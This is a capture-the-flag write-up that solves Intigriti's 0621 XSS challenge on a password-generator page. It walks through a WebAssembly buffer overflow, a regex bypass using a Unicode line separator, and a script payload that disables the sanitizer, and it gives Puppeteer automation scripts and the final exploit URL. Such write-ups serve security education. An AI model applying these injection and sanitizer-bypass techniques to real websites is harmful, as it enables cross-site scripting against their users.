# Intigriti's 0621 XSS challenge - by Physuru (@cffaedfe)

## Target

The challenge is hosted at https://challenge-0621.intigriti.io, and the tweet about it is https://twitter.com/intigriti/status/1406945285771759626.

As stated on the challenge's page, we need to find a way to execute arbitrary javascript on the challenge page. However, there are a few rules and information:
```
Rules:
    This challenge runs from June 21 until June 27th, 11:59 PM CET.
    Out of all correct submissions, we will draw six winners on Monday, June 28th:
        Three randomly drawn correct submissions
        Three best write-ups
    Every winner gets a €50 swag voucher for our swag shop
    The winners will be announced on our Twitter profile.
    For every 100 likes, we'll add a tip to announcement tweet.


The solution...
    Should work on the latest version of Firefox or Chrome
    Should execute alert(document.domain).
    Should leverage a cross site scripting vulnerability on this domain.
    Shouldn't be self-XSS or related to MiTM attacks
    Should be reported at go.intigriti.com/submit-solution

```
(taken from https://challenge-0621.intigriti.io / 2021-06-24 18:00 CET)

Right here we notice, that the usual sentence `Should not use any user interaction` is not included in the rules. So this solution might take user interaction.

## Hints

Again Intigriti did not really comply with their rule of releasing hints every 100 likes, but releasing them earlier. In my opinion this was a good decision, since I would have struggled even more without the hints.

1.  >Alright, the first 100 likes are in! Have you watched the line terminator movies?
    https://twitter.com/intigriti/status/1406970119478259714

2.  >We have not reached 200 yet, but I wanted to let you know that there is only one Json Bourne 
    https://twitter.com/intigriti/status/1407044172729757702

3.  >WAT the heck is wrong with Sherlock today or was his name Malloc (I don't really remember)?t
    https://twitter.com/intigriti/status/1407249386493648898

4.  >Don't forget to have a SIGNED INTEGER insurance in case you once end up having a water OVERFLOW.
    >
    >Our insurance broker also told us that assigning to className might be a key strategy here
    https://twitter.com/intigriti/status/1407587539268083716

5.  >You wanted it, you get it - https://pastebin.com/n0vWtyQN (Source code of the wasm file)
    https://twitter.com/intigriti/status/1407657190320640005

6.  >Assigning is hard. Two lines stacked on top of one another. Not allowed. What if they could just spend some time next to each other, you know, at eye level? 
    >
    >-- (happy lines)
    https://twitter.com/intigriti/status/1407972116985794562

## Inspecting and understanding index.php

The index file claimed the following:

> Your password has been breached! Make sure to get a new one as soon as possible!
> Coincidentially, we do have a "super secure" password generator for you

And below that was a password generator which already looked like being in a frame. Looking at the source revealed that:
```html
    [...]
    <iframe src="./passgen.php" width="600" height="400" frameBorder="0"></iframe
    [...]
```

## Inspecting and understanding passgen.php

The passgen.php is much more of interest than the index file. 
Looking at the password generator, it accepts the following input:
- The length of the password, entered as "free text" in an input field
- A flag if numbers are allowed in the password rendered in a "checkbox"
- A flag if symbols are allowed in the password rendered in a "checkbox"

The output is a HTML-popup with the text `Your password is: KM(gu!KU` and a `OK`-button, which will reload the queryparameters with the actual timestamp when pressend. The whole HTML popup is rendered inside a div with the class `alert`:
```html
    <div class="alert">
        <div class="alert-inner">
            <div class="page-bar">
                <h3>Password Generated</h3>
                <button onclick="generateAnother();">OK</button>
            </div>
            <div class="page-content">
                Your password is: 5rjjb5jz
            </div>
        </div>
    </div>
```

Inspecting the `generateAnother` function shows, that this will set the `passwordLength`, `allowNumbers`, `allowSymbols` and `timestamp` parameters as queryparameters and thus will reload the page:
```js
function generateAnother() {
    let params = new URLSearchParams;
    params.set("passwordLength", inputFields.passwordLength.value);
    params.set("allowNumbers", inputFields.allowNumbers.checked);
    params.set("allowSymbols", inputFields.allowSymbols.checked);
    params.set("timestamp", Number(new Date));
    location.search = params;
}
```

Looking at the code, that is executed once the page is loaded will show, that the input of the queryparameters is taken and written to the values of their corresponding inputfields:
```js
let settings = new URLSearchParams(location.search);
inputFields.passwordLength.value = settings.get("passwordLength") ?? 8;
inputFields.allowNumbers.checked = settings.get("allowNumbers") !== "false";
inputFields.allowSymbols.checked = settings.get("allowSymbols") !== "false";
```

Checking these inputfields will show, that the input type of the `passwordLength` input is not set to `number` and thus, this will allow entering characters as well:
```html
<input size="4" id="password-length" />
```

The `Generate` button on the page will call the method `generate` which looks like the following:
```js
async function generate() {
    if (generating) {
        return;
    }
    requestAnimationFrame(_ => (generating = false));
    generating = true;
    let passwordLength = inputFields.passwordLength.value;
    let json = `{ "passwordLength": ${passwordLength}, "seed": ${crypto.getRandomValues(new Uint32Array(1))[0]}, "allowNumbers": ${inputFields.allowNumbers.checked}, "allowSymbols": ${inputFields.allowSymbols.checked} }`;
    if (!(passwordLength = passwordLength.match(/^\d+$/gm))) {
        return showMessage("Error", "Password Length must be a number.");
    }
    passwordLength = Number(passwordLength[0]);
    let wasm = await WebAssembly.instantiateStreaming(fetch("program.wasm"), { env: { log_str: idx => {
        let str = "";
        while (u8[idx] != 0) {
            str += String.fromCodePoint(u8[idx]);
            ++idx;
        }
        console.log(str);
    }, log_int: console.log, }});
    let u8 = new Uint8Array(wasm.instance.exports.memory.buffer);
    let options = wasm.instance.exports.malloc(json.length + 1);
    let password = wasm.instance.exports.malloc(Number(passwordLength) + 1);
    for (let idx = 0; idx < json.length; ++idx) {
        u8[options + idx] = json.codePointAt(idx) % 0xff;
    }
    u8[options + json.length] = 0;
    wasm.instance.exports.generate_password(options, password);
    let output_password = "";
    for (let idx = 0; idx < passwordLength; ++idx) {
        output_password += String.fromCodePoint(u8[password + idx]);
    }
    showMessage("Password Generated", "Your password is: " + output_password, { text: "OK", action: "generateAnother();", });
}
```

Analyzing the `generate` method:
1. The method will straight return if the boolean `generating` is set to true.
2. The boolean `generating` is set to `false`, when the next repaint happens - due to the call of `requestAnimationFrame(_ => (generating = false));`.
3. After that `generating` is set to `true`.
4. In the next lines a JSON object is formed. The weird part about this is the way of generating a stringified JSON directly in a template. A "normal" way of creating this string is forming an object and then calling `JSON.stringify` on that. Nevertheless, the JSON object looks like this:
```js
{ 
    "passwordLength": ${inputFields.passwordLength.value},
    "seed": ${crypto.getRandomValues(new Uint32Array(1))[0]},
    "allowNumbers": ${inputFields.allowNumbers.checked},
    "allowSymbols": ${inputFields.allowSymbols.checked}
}
```
We notice, that the value of the `passwordLength` input field is passed directly into the string. This allows tampering the JSON with overwriting the seed or adding additional fields into the object. 

5. The following code
```js
if (!(passwordLength = passwordLength.match(/^\d+$/gm))) {
    return showMessage("Error", "Password Length must be a number.");
}
passwordLength = Number(passwordLength[0]);
```
is supposed to check if the value of `passwordLength` only contains digits (`\d`), from the start (`^`) to the end `$` of **each line** (`gm`). Meaning, if we get a line-seperator into the value of `passwordLength` we can get any characters into the json - since the json is formed before this check - and successfully pass this check. More on that after we completely analyzed the code.

6. The next bit of code will initialize a WebAssembly program from the file `program.wasm`:
```js
let wasm = await WebAssembly.instantiateStreaming(fetch("program.wasm"), { env: { log_str: idx => {
    let str = "";
    while (u8[idx] != 0) {
        str += String.fromCodePoint(u8[idx]);
        ++idx;
    }
    console.log(str);
}, log_int: console.log, }});
```

7. After that some variables and memory space inside the WebAssembly program is allocated:
```js
let u8 = new Uint8Array(wasm.instance.exports.memory.buffer);
let options = wasm.instance.exports.malloc(json.length + 1);
let password = wasm.instance.exports.malloc(Number(passwordLength) + 1)
```
`u8` is set to a reference of the memory inside the WASM program. After that memory space for the `json` string and the generated password is allocated. `malloc` is reserving that amount of space inside `memory.buffer` and is returning a pointer to that address.

8. The pointer of the `options` variable is then used to write the contents of `json` into the WASM program's buffer:
```js
for (let idx = 0; idx < json.length; ++idx) {
    u8[options + idx] = json.codePointAt(idx) % 0xff;
}
u8[options + json.length] = 0;
```  

9. After getting the options into the WASM program, the method to generate a password is called with both pointers to the input of the options and the output of the password as parameters:
```js
wasm.instance.exports.generate_password(options, password);
```

10. After that call, the memory of the password is read and saved into a local variable:
```js
let output_password = "";
for (let idx = 0; idx < passwordLength; ++idx) {
    output_password += String.fromCodePoint(u8[password + idx]);
}
```

11. The last instruction of `generate()` is a call ot `showMessage` containing the value of the output password:
```js
showMessage("Password Generated", "Your password is: " + output_password, { text: "OK", action: "generateAnother();", });
```

Analyzing the `showMessage` method shows the following code:
```js
function showMessage(title = "", message = "", button = { text: "Close", action: "this.parentElement.parentElement.parentElement.remove();", }) {
    let elem = (new Range).createContextualFragment(`
        <div class="alert">
            <div class="alert-inner">
                <div class="page-bar">
                    <h3>${sanitize(title)}</h3>
                    <button onclick="${sanitize(button.action)}">${sanitize(button.text)}</button>
                </div>
                <div class="page-content">
                    ${sanitize(message)}
                </div>
            </div>
        </div>
    `);
    document.body.append(elem);
}
```

The method basically takes some input parameters, calls the method `sanitize` on them and displays them in some HTML in the document. With the knowledge from `generate`, the generated password is displayed via the `message` parameter of `showMessage`.

Analying the `sanitize` method:
```js
function sanitize(str) {
    str += "";
    f7or (let char of unsafeCharacters) {
        str = str.replaceAll(char, `&#x${char.codePointAt().toString(0x10)};`);
    }
    return str;
}
```

This method loops through all characters in ``const unsafeCharacters = ["&", "`", "\"", "{", "}", "(", ")", "[", "]", "=", ",", "+"];`` and replacing all instances of these 'unsafe' characters with their HTML notation. Looking at the forbidden characters shows, that no real XSS is possible right of the bat, nevertheless HTML injection would be possible, since `<` and `>` are not blocked.
Furthermore, this kind of sanitization is kinda wonky, since we are blocking some characters, but not all (e.g. using `encodeURIComponent'`). In CTF this usually means, that we have to inject something here.

To have a short wrapup of the analysis:
- input is taken from URL parameters
- input is unsanitized written into an object, which is used by the WASM program
- output of the WASM program is written "sanitized" to the DOM
- sanitization is wonky and allows the use of HTML and certain characters

## Exploiting the program

The goal is clear: we have to input the right string, to get our wanted XSS.

### Memory overflow

With the knowledge of hints 3, 4 and 5 we know, that we have to get some kind of buffer overflow. With the analysis in mind, we know, that there is memory allocated for the password based on it's length. When we set this to a large number (https://challenge-0621.intigriti.io/passgen.php?passwordLength=65535&allowNumbers=true&allowSymbols=true&timestamp=1624554294300), the script throws an error: `Uncaught (in promise) RuntimeError: index out of bounds`

So, overflowing with the password length seems possible but does not result in anything useful. The other part, that was written to the memory, is the JSON object. If we prepend the passswordLength with zeros, we can keep the passwordLength low but still can try to overflow with the JSON object.

Instead of trying to find that spot manually, we can automate and "fuzz" these things - sorry @intigriti, hopefully this "fuzzing" was okay.

#### Finding the overflow with automation

Since I am a JS person, I like to program things in NodeJS. Luckily NodeJS has the great package puppeteer (https://github.com/puppeteer/puppeteer) with enables the use of a headless chrome.

To see if we can call the `generate` function, I start with the following script:
```js
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('https://challenge-0621.intigriti.io/passgen.php?passwordLength=0100&allowNumbers=true&allowSymbols=true&timestamp=1624556811000');
  await page.evaluate("generate()");
  await page.screenshot({path:__dirname+'/screen.jpg'});
  await browser.close();
})();
```

Looking at the screenshot shows the popup with the generated password. Nevertheless, it is better to get the contents of the password-popup in the script to get a better evaluation:

```js
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('https://challenge-0621.intigriti.io/passgen.php?passwordLength=0100&allowNumbers=true&allowSymbols=true&timestamp=1624556811000');
  await page.evaluate("generate()");
  const passwordContent = await page.$$eval('.alert .page-content', node=>node[0].innerText);
  const plainPassword = passwordContent.replace('Your password is: ','');
  console.log(plainPassword.length, plainPassword);
  await browser.close();
})();
```

With that code the browser opens the page and gets the `innerText` of the HTMLNode with the class `pagen-content` inside a node with class `alert`. After removing the static string `Your password is: ` we can get the length of the password and the content of it. 
Next step is to iterate through and prepend passwordLength with a 0 for each run:

```js
const puppeteer = require("puppeteer");

const realPasswordLength = 3000;
async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  for (let i = 0; i < 10000; i += 100) {
    console.log(`Run number ${i}`);
    const input = `${"0".repeat(i)}${realPasswordLength}`;
    await page.goto(
      `https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`
    );
    await page.evaluate("generate()");
    const passwordContent = await page.$$eval(
      ".alert .page-content",
      (node) => node[0].innerText
    );
    const plainPassword = passwordContent.replace("Your password is: ", "");
    if (plainPassword.length != realPasswordLength) {
      console.log(i, plainPassword.length, plainPassword);
    }

    await sleep(1000);
  }
  await browser.close();
})();
```

This script will open the challenge page with the following input for `passwordLength`: `'0'*i + '3000'`.
So we are expecting the password to have a length of 3000 and if that doesn't have the length, we will get the output. Since we don't have to increase the prepending zeros with the factor 1, we also can add 100 zeros at each run of the loop. 
If we run this script, we will get some output at exactly 1000 prepending zeros:
```
1000 1165 RUUø
              ,T44abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZSClpasdLen: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000, "seed": 2655414744, "allowNumbers": true, "allowSymbols": true }
```

To explain the output a bit:
- 1000 is the number of prepended zeros
- 1165 is the length of the contents inside the HTML node. This would normally be the length of the generated password.
- The contents after that would normally be the generated password. In this case we can see the output of the WASM programs memory.

Good for us, we see something of the supposed JSON object. The buffer overflow is beaten, now we need to get some contents deliverd.

### Content injection 
The goal is now to get some content injected into the buffer, to show that on the page. Using hint 1 and the knowledge we got from analyzing the regular expression, we need to terminate the lines, to have valid numbers in the first line and other arbitrary content in the second line.

After googling for `unicode line separator` (https://www.google.com/search?q=unicode+line+separator) we get the unicode character for a line sepator is `U+2028` or `%E2%80%A8` in an url encoded way. Let's see what happens if we put that into our automation script:

```js
const puppeteer = require("puppeteer");

const realPasswordLength = 3000;
async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  const input = `${"0".repeat(1000)}${realPasswordLength}%E2%80%A8test`;
  await page.goto(
    `https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`
  );
  await page.evaluate("generate()");
  const passwordContent = await page.$$eval(
    ".alert .page-content",
    (node) => node[0].innerText
  );
  const plainPassword = passwordContent.replace("Your password is: ", "");
  console.log(plainPassword.length, plainPassword);

  await sleep(1000);
  await browser.close();
})();
```

In the line ``const input = `${"0".repeat(1000)}${realPasswordLength}%E2%80%A8test`;`` we set our 1000 zeros, a 3000 passwordlength, the line separator and then the string `test`. And the result makes us happy, because we also find the string `test` in the response:
```
1180 ÿÿÿÿêíêýílVYYø
    [...]
    03000Htest, "seed": 997518570, "allowNumbers": true, "allowSymbols": true }
```

So we sucessfully got content injection.

### Sanitization bypass
Since we now have content injection, we need to get a way to bypass the sanitization. Because we can not assign anything or call any methods, getting XSS is pretty hard. Here is were I struggled the most, until hint 6 came out and some discussion with https://twitter.com/totz_sec and [https://twitter.com/xEHLE_](https://twitter.com/xEHLE_) lead to success. 

Hint 6 showed the decrement operator `--` which is also an asignment. This operator takes a value and then decrements it by one. If that value is not a number, it will be set to `NaN`. Using this and knowing, that the script for the challenge is in the global context, we can change the length of the `unsafeCharacters` array to 0, to not have any blocked characters anymore:

```html
<script>
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
</script>
```

Validating this with the automation script, shows the `unsafeCharacters` object is now an empty array (`[]`):
```js
[...]
const payload = `<script>
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
</script>`;

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  const input = `${"0".repeat(1000)}${realPasswordLength}%E2%80%A8${encodeURIComponent(payload)}`;
  const url = `https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`
  await page.goto(
    url
  );
  await page.evaluate("generate()");
  console.log(await page.evaluate("unsafeCharacters")); // -> []

  await sleep(1000);
  await browser.close();
})();
```

As soon as this array is emptied, we can also add previously blocked characters and thus can get XSS running. But how do we change the payload for the second `generate` call?

Well, we don't change the payload. We will just add it to the first one and ignore any errors thrown:

```html
<script>
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
    unsafeCharacters.length--;
</script>
<script>
    alert(document.domain);
</script>
```

The automation script took me some time there, since there is a bug in puppeteer which does not allow to take screenshots while an alert box is opened:
```js
[...]
const payload = `<script>
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
</script>
<script>
alert(document.domain)
</script>`;

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  page.on("dialog", async (dialog) => {
    //await page.screenshot({ path: __dirname + "/screen2.jpg" }); -> fails due to https://github.com/puppeteer/puppeteer/issues/2481
    console.log(dialog.message());
    await dialog.dismiss();
  });
  const input = `${"0".repeat(
    1000
  )}${realPasswordLength}%E2%80%A8${encodeURIComponent(payload)}`;
  const url = `https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`;
  console.log(url);
  await page.goto(url);

  await page.evaluate("generate();");

  await page.evaluate("generate();");

  await sleep(1000);
  await browser.close();
})();
```

Nevertheless, the URL I crafted is the following:
https://challenge-0621.intigriti.io/passgen.php?passwordLength=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000%E2%80%A8%3Cscript%3E%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0A%3C%2Fscript%3E%0A%3Cscript%3E%0Aalert(document.domain)%0A%3C%2Fscript%3E&allowNumbers=true&allowSymbols=true&timestamp=1624556811000

But then, I noticed, that this solution does not work in a real world scenario, since the generate button is blocked by the popup, and when closing the popup the page will reload. So we need to find a way to hide the popup. Luckily we still have hint 4, where something with `className` is mentioned. Obviously we have to change the class of the popup element to hide it. 
After looking around in keys on `document.body` I found `lastElementChild` which is a reference to the popup. With `document.body.lastElementChild.className--;` we can easily close the popup and click generate a second time to have XSS.

Full automationscript with payload:
```
const puppeteer = require("puppeteer");

const realPasswordLength = 3000;
async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const payload = `<script>
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
unsafeCharacters.length--;
document.body.lastElementChild.className--;
</script>
<script>
alert(document.domain)
</script>`;

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  await page
    .evaluate("window.onerror=console.log")
    .catch((e) => console.log(e));
  page.on("dialog", async (dialog) => {
    //await page.screenshot({ path: __dirname + "/screen2.jpg" }); -> fails due to https://github.com/puppeteer/puppeteer/issues/2481
    console.log(dialog.message());
    await dialog.dismiss();
  });
  const input = `${"0".repeat(
    1000
  )}${realPasswordLength}%E2%80%A8${encodeURIComponent(payload)}`;
  const url = `https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`;
  console.log(url);
  await page.goto(url);

  await page.evaluate("generate();");

  await page.evaluate("generate();");

  await sleep(1000);
  await browser.close();
})();
```

Results in the following URL:
https://challenge-0621.intigriti.io/passgen.php?passwordLength=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000%E2%80%A8%3Cscript%3E%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0AunsafeCharacters.length--%3B%0Adocument.body.lastElementChild.className--%3B%0A%3C%2Fscript%3E%0A%3Cscript%3E%0Aalert(document.domain)%0A%3C%2Fscript%3E&allowNumbers=true&allowSymbols=true&timestamp=1624556811000
